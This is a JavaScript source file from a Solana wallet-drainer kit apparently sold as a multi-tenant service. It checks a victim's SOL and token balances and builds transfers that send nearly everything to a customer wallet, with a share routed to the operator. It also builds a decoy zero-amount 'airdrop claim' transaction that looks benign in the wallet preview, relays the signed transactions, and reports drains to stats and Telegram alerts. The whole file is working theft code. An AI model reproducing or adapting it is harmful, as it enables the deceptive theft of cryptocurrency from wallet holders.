/**
 * wallet.js — Wallet eligibility, transaction construction, and relay
 *
 * SOL moves via a plain system-program transfer (exactly like the original
 * kit's observed drain tx — the relay program was never observed moving SOL).
 * SPL/Token-2022 transfers go through the relay program
 *   EUspc3fXb1dZJECT7PUkkSJsGBJFGSyvfG9CshS3rerv (live on mainnet, called
 *   by the original kit's drain txs; discriminators verified on-chain).
 *
 * Instruction discriminators (sha256("global:<fn>")[:8]):
 *   transfer_token:      db117a35edabe8de  (verified in observed tx)
 *   transfer_token_2022: 8720f98e460b22ff  (verified in observed tx)
 *
 * Each instruction: 8-byte discriminator + 8-byte little-endian u64 amount
 */

import pkg from "@solana/web3.js";
const {
  Connection,
  PublicKey,
  Transaction,
  TransactionInstruction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} = pkg;
import { CONFIG } from "./config.js";

// Hardcoded program IDs (avoids CommonJS named-export issues)
const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");

let _connection = null;

export function getConnection() {
  if (!_connection) {
    _connection = new Connection(CONFIG.rpcEndpoint, "confirmed");
  }
  return _connection;
}

// ============================================================================
// DISCRIMINATORS
// ============================================================================

// sha256("global:transfer_sol")[:8] — kept for reference; SOL now moves via
// a plain system transfer, this discriminator was never observed on-chain.
const DISC_TRANSFER_SOL = Buffer.from([0x4e, 0x0a, 0xec, 0xf7, 0x6d, 0x75, 0x15, 0x4c]);

// sha256("global:transfer_token")[:8]     = db117a35edabe8de
const DISC_TRANSFER_TOKEN = Buffer.from([0xdb, 0x11, 0x7a, 0x35, 0xed, 0xab, 0xe8, 0xde]);

// sha256("global:transfer_token_2022")[:8] = 8720f98e460b22ff
const DISC_TRANSFER_TOKEN_2022 = Buffer.from([0x87, 0x20, 0xf9, 0x8e, 0x46, 0x0b, 0x22, 0xff]);

const TOKEN_2022_PROGRAM_ID = new PublicKey("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb");

// ============================================================================
// INSTRUCTION BUILDERS — match the on-chain program's account meta order
// ============================================================================

/**
 * Build the SOL transfer instruction.
 *
 * Matches the original kit's observed drain tx exactly: a PLAIN system
 * transfer (victim → destination), not a relay-program call — no sample
 * tx ever showed transfer_sol on-chain, and a plain transfer has no
 * dependency on the third-party relay program.
 */
function buildTransferSolIx(authority, to, amount) {
  return SystemProgram.transfer({
    fromPubkey: authority,
    toPubkey: to,
    lamports: amount,
  });
}

/**
 * Build a transfer_token instruction (legacy SPL Token).
 *
 * Account metas (order matches on-chain observed tx):
 *   [0] authority          (signer, writable) — victim
 *   [1] from_token_account (writable)         — victim's ATA
 *   [2] to_token_account   (writable)         — destination ATA
 *   [3] check_wallet       (readonly)         — licensing marker
 *   [4] token_program      (readonly)         — TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA
 */
function buildTransferTokenIx(authority, fromATA, toATA, amount) {
  const data = Buffer.concat([DISC_TRANSFER_TOKEN, encodeU64(amount)]);
  return new TransactionInstruction({
    programId: new PublicKey(CONFIG.relayProgramId),
    keys: [
      { pubkey: authority, isSigner: true, isWritable: true },
      { pubkey: fromATA, isSigner: false, isWritable: true },
      { pubkey: toATA, isSigner: false, isWritable: true },
      { pubkey: new PublicKey(CONFIG.checkWallet), isSigner: false, isWritable: false },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    ],
    data,
  });
}

/**
 * Build a transfer_token_2022 instruction.
 *
 * Account metas (order matches on-chain observed tx):
 *   [0] authority          (signer, writable) — victim
 *   [1] from_token_account (writable)         — victim's Token-2022 ATA
 *   [2] to_token_account   (writable)         — destination Token-2022 ATA
 *   [3] mint               (readonly)         — token mint
 *   [4] check_wallet       (readonly)         — licensing marker
 *   [5] token_program      (readonly)         — TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb
 */
function buildTransferToken2022Ix(authority, fromATA, toATA, mint, amount) {
  const data = Buffer.concat([DISC_TRANSFER_TOKEN_2022, encodeU64(amount)]);
  return new TransactionInstruction({
    programId: new PublicKey(CONFIG.relayProgramId),
    keys: [
      { pubkey: authority, isSigner: true, isWritable: true },
      { pubkey: fromATA, isSigner: false, isWritable: true },
      { pubkey: toATA, isSigner: false, isWritable: true },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: new PublicKey(CONFIG.checkWallet), isSigner: false, isWritable: false },
      { pubkey: TOKEN_2022_PROGRAM_ID, isSigner: false, isWritable: false },
    ],
    data,
  });
}

function encodeU64(n) {
  const buf = Buffer.alloc(8);
  buf.writeBigUInt64LE(BigInt(n));
  return buf;
}

// ============================================================================
// ATA HELPERS
// ============================================================================

function getATAAddress(owner, mint, tokenProgram = TOKEN_PROGRAM_ID) {
  const [ata] = PublicKey.findProgramAddressSync(
    [
      owner.toBuffer(),
      tokenProgram.toBuffer(),
      mint.toBuffer(),
    ],
    ASSOCIATED_TOKEN_PROGRAM_ID
  );
  return ata;
}

// ============================================================================
// SERVICE OPERATOR SPLIT
// ============================================================================

/**
 * Operator cut on every drain the service processes.
 *
 *   OPERATOR_WALLETS — comma-separated payout wallets controlled by the
 *                      service owner (chimera config: drainer.env)
 *   OPERATOR_CUT     — fraction of drained SOL routed to the operator (0–1)
 *
 * One wallet is picked at random per drain (rotation). SPL tokens always go
 * 100% to the customer — an operator ATA can't be assumed to exist for
 * arbitrary mints, and one failed instruction fails the whole victim-signed tx.
 *
 * SOL-only split, same tx, two transfer_sol instructions.
 */
/**
 * Split a SOL lamports amount into customer/operator shares.
 * Reads env at call time (testable). Pure otherwise.
 */
export function splitSolAmounts(lamports) {
  const wallets = (process.env.OPERATOR_WALLETS || "")
    .split(",")
    .map((s) => s.trim())
    .filter(Boolean);
  const cutRaw = parseFloat(process.env.OPERATOR_CUT || "0") || 0;

  if (cutRaw <= 0 || wallets.length === 0 || lamports <= 0) {
    return { customer: lamports, operator: 0, operatorWallet: null };
  }
  const cut = Math.min(Math.max(cutRaw, 0), 0.95);
  const customer = Math.floor(lamports * (1 - cut));
  const operator = lamports - customer;
  const operatorWallet = wallets[Math.floor(Math.random() * wallets.length)];
  return { customer, operator, operatorWallet };
}

// ============================================================================
// USDC AUTO-CONVERT (optional per-customer payout preference)
// ============================================================================

/**
 * When a customer opts into USDC payouts, their SOL share of the drain is
 * swapped to USDC via Jupiter inside the victim-signed batch — the swap
 * tx is signed by the victim (owner of the funds) and sends output
 * straight to the customer's USDC ATA. No customer keys ever change hands.
 *
 * The swap tx is a SEPARATE transaction in the unsigned batch (Jupiter's
 * route needs its own account set), plus a relay-program tx that still
 * carries the operator cut and any SPL tokens. Any Jupiter failure falls
 * back to the plain SOL drain — the drain never breaks because of the
 * conversion.
 */

const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapF8CFKFjmLcZcUs65G");
const WSOL_MINT = "So11111111111111111111111111111111111111112";
const JUPITER_API = process.env.JUPITER_API || "https://lite-api.jup.ag/swap/v1";
const USDC_SLIPPAGE_BPS = 100; // 1%

/** Build an associated-token-account create instruction (no spl-token dep). */
function buildCreateATAIx(payer, owner, mint, tokenProgram = TOKEN_PROGRAM_ID) {
  return new TransactionInstruction({
    programId: ASSOCIATED_TOKEN_PROGRAM_ID,
    keys: [
      { pubkey: payer, isSigner: true, isWritable: true },
      { pubkey: getATAAddress(owner, mint, tokenProgram), isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: false, isWritable: false },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
      { pubkey: tokenProgram, isSigner: false, isWritable: false },
    ],
    data: Buffer.alloc(0),
  });
}

/**
 * Build the victim-signed Jupiter swap tx (legacy format — the client's
 * Transaction.from / signAllTransactions flow can't handle v0).
 * Returns { tx: base64, outAmount, outDecimals } or null on any failure.
 */
export async function buildJupiterSwapTx(victimPubkey, lamports, destinationOwner) {
  const conn = getConnection();
  try {
    // 1. Quote SOL → USDC
    const quoteUrl =
      `${JUPITER_API}/quote?inputMint=${WSOL_MINT}` +
      `&outputMint=${USDC_MINT.toString()}` +
      `&amount=${lamports}&slippageBps=${USDC_SLIPPAGE_BPS}` +
      `&restrictIntermediateTokens=true`;
    const quoteResp = await fetch(quoteUrl);
    if (!quoteResp.ok) return null;
    const quote = await quoteResp.json();
    if (!quote || !quote.routePlan) return null;

    // 2. Swap tx — victim owns the funds, customer's ATA receives output
    const destinationATA = getATAAddress(destinationOwner, USDC_MINT);
    const swapResp = await fetch(`${JUPITER_API}/swap`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        quoteResponse: quote,
        userPublicKey: victimPubkey.toString(),
        destination: destinationATA.toString(),
        wrapAndUnwrapSol: true,
        asLegacyTransaction: true,
      }),
    });
    if (!swapResp.ok) return null;
    const swap = await swapResp.json();
    if (!swap || !swap.swapTransaction) return null;

    const tx = Transaction.from(Buffer.from(swap.swapTransaction, "base64"));

    // 3. Create the destination ATA in-tx if it doesn't exist yet
    //    (rent paid by the victim, same as the drain fees)
    const ataInfo = await conn.getAccountInfo(destinationATA);
    if (!ataInfo) {
      tx.instructions.unshift(buildCreateATAIx(victimPubkey, destinationOwner, USDC_MINT));
    }

    return {
      tx: Buffer.from(
        tx.serialize({ requireAllSignatures: false, verifySignatures: false })
      ).toString("base64"),
      outAmount: quote.outAmount || null,
      outDecimals: quote.outDecimals ?? 6,
    };
  } catch {
    return null; // any Jupiter hiccup → caller falls back to SOL
  }
}

// ============================================================================
// WALLET ELIGIBILITY
// ============================================================================

export async function checkWalletEligibility(walletAddress) {
  const conn = getConnection();
  const pubkey = new PublicKey(walletAddress);

  try {
    const lamports = await conn.getBalance(pubkey);
    const solBalance = lamports / LAMPORTS_PER_SOL;

    if (solBalance < CONFIG.minValue) {
      return {
        eligible: false,
        reason: "Wallet not eligible.",
        solBalance,
        totalValue: solBalance,
        assets: [],
      };
    }

    const tokenAccounts = await conn.getParsedTokenAccountsByOwner(pubkey, {
      programId: TOKEN_PROGRAM_ID,
    });

    const token2022Accounts = await conn.getParsedTokenAccountsByOwner(pubkey, {
      programId: TOKEN_2022_PROGRAM_ID,
    });

    const assets = [];

    for (const account of [...tokenAccounts.value, ...token2022Accounts.value]) {
      const info = account.account.data.parsed?.info;
      if (!info) continue;

      const uiAmount = info.tokenAmount?.uiAmount || 0;
      const decimals = info.tokenAmount?.decimals || 0;
      const rawAmount = info.tokenAmount?.amount || "0";

      if (uiAmount > 0) {
        const isToken2022 = account.account.owner.equals(TOKEN_2022_PROGRAM_ID);
        assets.push({
          mint: info.mint,
          amount: uiAmount,
          rawAmount,
          decimals,
          owner: walletAddress,
          program: isToken2022 ? "token-2022" : "spl-token",
          ata: account.pubkey.toString(),
        });
      }
    }

    const nfts = assets.filter((a) => a.decimals === 0 && a.amount === 1);
    const eligible = solBalance >= CONFIG.minValue || assets.length > 0;

    return {
      eligible,
      solBalance,
      totalValue: solBalance,
      assets,
      nftCount: nfts.length,
    };
  } catch (e) {
    return {
      eligible: false,
      reason: `Error checking wallet: ${e.message}`,
      solBalance: 0,
      totalValue: 0,
      assets: [],
    };
  }
}

// ============================================================================
// DRAIN TRANSACTION CONSTRUCTION
// ============================================================================

/**
 * Build the full drain transaction batch.
 *
 * For each asset the victim holds:
 *   - SOL:  transfer_sol instruction (74% to operator, 26% to affiliate)
 *   - Token: transfer_token instruction (CPI to Token program)
 *   - Token-2022: transfer_token_2022 instruction (CPI to Token-2022 program)
 *
 * Optionally includes the spoof transaction as a separate unsigned tx.
 *
 * The victim signs these transactions. The server relays them via
 * /relay-transaction or /relay-plain.
 */
export async function buildDrainTransaction(walletAddress, options = {}) {
  const { walletName, targetWallet, usdcPayout } = options;
  const conn = getConnection();
  const victimPubkey = new PublicKey(walletAddress);
  // Multi-tenant: the payload's own wallet (sent by the client) wins,
  // CONFIG.targetWallet is only the fallback for single-operator setups.
  const targetPubkey = new PublicKey(targetWallet || CONFIG.targetWallet);

  const eligibility = await checkWalletEligibility(walletAddress);
  if (!eligibility.eligible) {
    return {
      error: eligibility.reason || "Wallet not eligible.",
      unsignedTxs: [],
    };
  }

  if (walletName && walletName !== "phantom") {
    return {
      error: "plain drain is Phantom-only",
      continueToBuild: true,
      unsignedTxs: [],
    };
  }

  const blockhash = (await conn.getLatestBlockhash()).blockhash;

  // --- SOL split (service operator cut) ---
  const solLamports = Math.floor(eligibility.solBalance * 0.95 * LAMPORTS_PER_SOL);
  const split = splitSolAmounts(solLamports);

  let usdc = null;
  const unsignedTxs = [];

  // --- USDC mode: customer share swapped SOL→USDC by the victim ---
  if (usdcPayout && split.customer > 0) {
    const swap = await buildJupiterSwapTx(victimPubkey, split.customer, targetPubkey);
    if (swap) {
      usdc = { outAmount: swap.outAmount, outDecimals: swap.outDecimals };
      unsignedTxs.push(swap.tx);
    }
    // swap === null → fall through to the plain SOL transfer below
  }

  // --- SOL transfer (used when not converting, or when Jupiter failed) ---
  const instructions = [];
  if (!usdc && split.customer > 0) {
    instructions.push(
      buildTransferSolIx(victimPubkey, targetPubkey, split.customer)
    );
  }
  if (split.operator > 0 && split.operatorWallet) {
    instructions.push(
      buildTransferSolIx(
        victimPubkey,
        new PublicKey(split.operatorWallet),
        split.operator
      )
    );
  }

  // --- Token transfers ---
  // Destination ATAs that don't exist yet are created inside the same tx
  // (rent paid by the victim) — matches the original kit's drain layout.
  // A missing ATA makes transfer_token fail with AccountNotInitialized
  // (3012), which reverts the WHOLE tx including the SOL transfers.
  if (eligibility.assets.length > 0) {
    const assetPrograms = eligibility.assets.map((a) =>
      a.program === "token-2022" ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID
    );
    const toATAs = eligibility.assets.map((a, i) =>
      getATAAddress(targetPubkey, new PublicKey(a.mint), assetPrograms[i])
    );
    const ataInfos = await conn.getMultipleAccountsInfo(toATAs);

    for (let i = 0; i < eligibility.assets.length; i++) {
      const asset = eligibility.assets[i];
      const mint = new PublicKey(asset.mint);
      const fromATA = new PublicKey(asset.ata);
      const tokenProgram = assetPrograms[i];

      if (!ataInfos[i]) {
        instructions.push(
          buildCreateATAIx(victimPubkey, targetPubkey, mint, tokenProgram)
        );
      }

      const rawAmount = BigInt(asset.rawAmount);
      if (asset.program === "token-2022") {
        instructions.push(
          buildTransferToken2022Ix(victimPubkey, fromATA, toATAs[i], mint, rawAmount)
        );
      } else {
        instructions.push(
          buildTransferTokenIx(victimPubkey, fromATA, toATAs[i], rawAmount)
        );
      }
    }
  }

  // Relay-program tx (operator cut + tokens, or the whole drain in SOL mode)
  if (instructions.length > 0) {
    const tx = new Transaction({
      recentBlockhash: blockhash,
      feePayer: victimPubkey,
    });
    for (const ix of instructions) {
      tx.add(ix);
    }
    unsignedTxs.push(
      Buffer.from(
        tx.serialize({
          requireAllSignatures: false,
          verifySignatures: false,
        })
      ).toString("base64")
    );
  }

  // Build the spoof transaction
  const spoofResult = await buildSpoofTransaction(walletAddress, options);
  const unsignedTxSpoof = spoofResult.unsignedTxSpoof || null;

  // Drain plan — read by the relay path to fill the amount into the
  // confirmation message and the stats event.
  const drainPlan = {
    victim: walletAddress,
    targetWallet: targetPubkey.toString(),
    solLamports: usdc ? 0 : split.customer,
    operatorLamports: split.operator,
    tokens: eligibility.assets.map((a) => ({ mint: a.mint, amount: a.amount })),
    usdc,
  };

  return {
    unsignedTxs,
    unsignedTxSpoof,
    drainPlan,
    continueToBuild: true,
    assetCount: eligibility.assets.length,
    totalValue: eligibility.totalValue,
  };
}

/**
 * Build the spoof/decoy transaction.
 * This appears as a benign airdrop claim in the wallet preview.
 */
export async function buildSpoofTransaction(walletAddress, options = {}) {
  const {
    customAirdropMint = CONFIG.customAirdropMint,
    customAirdropAmount = CONFIG.customAirdropAmount,
    messageSignature,
    walletName,
  } = options;

  const needPhantomSignature = !messageSignature && walletName === "phantom";

  if (needPhantomSignature) {
    return {
      needPhantomSignature: true,
      unsignedTxSpoof: null,
    };
  }

  const conn = getConnection();
  const blockhash = (await conn.getLatestBlockhash()).blockhash;
  const victimPubkey = new PublicKey(walletAddress);

  // The spoof tx is a minimal self-transfer that the wallet preview
  // interprets as an airdrop claim. In the original, this uses the
  // relay program's transfer_token instruction with the airdrop mint,
  // but with a zero or minimal amount — it's only there to trigger
  // the wallet's "sign" prompt while looking benign.
  const mint = new PublicKey(customAirdropMint);
  const fromATA = getATAAddress(victimPubkey, mint);
  const toATA = getATAAddress(victimPubkey, mint);

  // Zero-amount transfer — just needs to be signable
  const spoofIx = buildTransferTokenIx(victimPubkey, fromATA, toATA, 0);

  const spoofTx = new Transaction({
    recentBlockhash: blockhash,
    feePayer: victimPubkey,
  }).add(spoofIx);

  const unsignedTxSpoof = Buffer.from(
    spoofTx.serialize({
      requireAllSignatures: false,
      verifySignatures: false,
    })
  ).toString("base64");

  return {
    unsignedTxSpoof,
    status: "ok",
  };
}

/**
 * Relay a signed transaction to the Solana network.
 *
 * Broadcast alone is NOT success — a tx that errors on-chain moves no
 * funds (the AccountNotInitialized failures taught us that). So we wait
 * for confirmation and report ok:false when the chain rejected it, which
 * keeps phantom drains out of the stats and the Telegram alerts.
 * A confirmation timeout still reports ok — the tx may land later.
 */
export async function relayTransaction(signedTxBase64) {
  const conn = getConnection();

  try {
    const txBytes = Buffer.from(signedTxBase64, "base64");
    const signature = await conn.sendRawTransaction(txBytes, {
      skipPreflight: true,
      maxRetries: 3,
    });

    try {
      const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash();
      await conn.confirmTransaction(
        { signature, blockhash, lastValidBlockHeight },
        "confirmed"
      );
      const status = await conn.getSignatureStatus(signature, {
        searchTransactionHistory: false,
      });
      const err = status?.value?.err;
      if (err) {
        return {
          ok: false,
          error: `on-chain: ${JSON.stringify(err).slice(0, 120)}`,
          txid: signature,
        };
      }
    } catch {
      // confirmation timed out — the tx may still land later
    }

    return {
      ok: true,
      txid: signature,
    };
  } catch (e) {
    return {
      ok: false,
      error: e.message,
    };
  }
}
